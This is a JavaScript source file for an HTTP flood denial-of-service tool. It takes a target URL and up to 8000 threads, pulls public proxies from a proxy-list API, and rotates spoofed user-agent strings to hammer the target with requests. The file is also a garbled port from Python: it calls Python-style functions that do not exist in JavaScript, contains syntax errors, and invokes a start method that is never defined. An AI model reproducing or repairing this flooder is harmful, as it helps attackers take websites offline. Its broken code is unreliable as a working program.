const request = require('request');
const fs = require('fs');
const { execSync } = require('child_process');
const colorama = require('colorama');
const cfscrape = require('cfscrape');

const { Fore, Style } = colorama;

if (process.argv.length === 2) {
  console.log(Fore.GREEN + 'Usage: ' + Fore.WHITE + process.argv[1] + Fore.YELLOW + ' [url] [thread]' + Style.RESET_ALL + Fore.RESET);
  process.exit();
}

function getProxy() {
  const list = 'proxy.txt';
  const url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all';

  request.get(url, (error, response, body) => {
    if (error) {
      console.error(error);
      return;
    }

    fs.writeFile(list, body, 'utf8', (err) => {
      if (err) {
        console.error(err);
        return;
      }

      const pprr = fs.readFileSync(list, 'utf8');
      // Do something with the proxy list
    });
  });
}

const useragents = [
  "Mozilla/5.0 (iPhone; CPU iPhone OS 7_8_1; like Mac OS X) AppleWebKit/536.7 (KHTML, like Gecko)  Chrome/49.0.1107.344 Mobile Safari/601.2",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 9_9_1; like Mac OS X) AppleWebKit/602.9 (KHTML, like Gecko)  Chrome/50.0.3274.311 Mobile Safari/533.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 9_4_8; like Mac OS X) AppleWebKit/603.49 (KHTML, like Gecko)  Chrome/47.0.3365.126 Mobile Safari/537.3",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 10_8_8; like Mac OS X) AppleWebKit/600.49 (KHTML, like Gecko)  Chrome/55.0.2354.363 Mobile Safari/534.0",
  "Mozilla/5.0 (iPad; CPU iPad OS 11_3_4 like Mac OS X) AppleWebKit/600.8 (KHTML, like Gecko)  Chrome/47.0.2039.232 Mobile Safari/534.9",
  "Mozilla/5.0 (iPod; CPU iPod OS 7_1_9; like Mac OS X) AppleWebKit/602.45 (KHTML, like Gecko)  Chrome/53.0.1361.287 Mobile Safari/600.9"
];

const acceptall = [
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", 
	"Accept-Encoding: gzip, deflate\r\n", 
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
];

const sender = function(url, number, proxy) {
  this.url = url;
  this.num = number;
  this.headers = { 'User-Agent': random.choice(useragents) };
  this.accept = { random.choice(useragents) };
  this.Lock = new threading.Lock();
  this.proxy = proxy;
};

sender.prototype.request = function() {
  const options = {
    url: this.url,
    headers: this.headers,
    body: null
  };

  const proxyUrl = `http://${this.proxy}`;
  options.proxy = proxyUrl;

  request(options, (error, response) => {
    if (error) {
      console.error(Fore.RED + 'Connect: ' + Fore.BLUE + 'fail!\n');
      process.exit(0);
    }
    
    console.log(Fore.GREEN + 'Connected: ' + Fore.CYAN + `${this.url}`);
  });
};

sender.prototype.run = function() {
  this.Lock.acquire();
  this.Lock.release();

  while (true) {
    try {
      this.request();
    } catch (error) {
      console.error(Fore.RED + 'Connect: ' + Fore.BLUE + 'fail!\n');
      process.exit(0);
    }
  }

  process.exit(0);
};

const MainLoop = {
  home: function() {
    getProxy();
    console.log(Style.RESET_ALL);

    let url;
    if (process.argv.length > 2) {
      url = process.argv[2];
    }

    let file_proxy;
    try {
      file_proxy = 'proxy.txt';
      fs.readFileSync(file_proxy, 'utf8');
    } catch (error) {
      file_proxy = 'proxy.txt';
      fs.readFileSync(file_proxy, 'utf8');
    }

    let num_threads;
    if (process.argv.length > 3) {
      num_threads = parseInt(process.argv[3]);
    } else {
      num_threads = 8000;
    }

    for (let i = 0; i < num_threads; i++) {
      const in_line = execSync(`sed -n '${i + 1}p' ${file_proxy}`).toString().trim();
      new sender(url, i + 1, in_line).start();
    }
  }
};

if (require.main === module) {
  MainLoop.home();
}

	
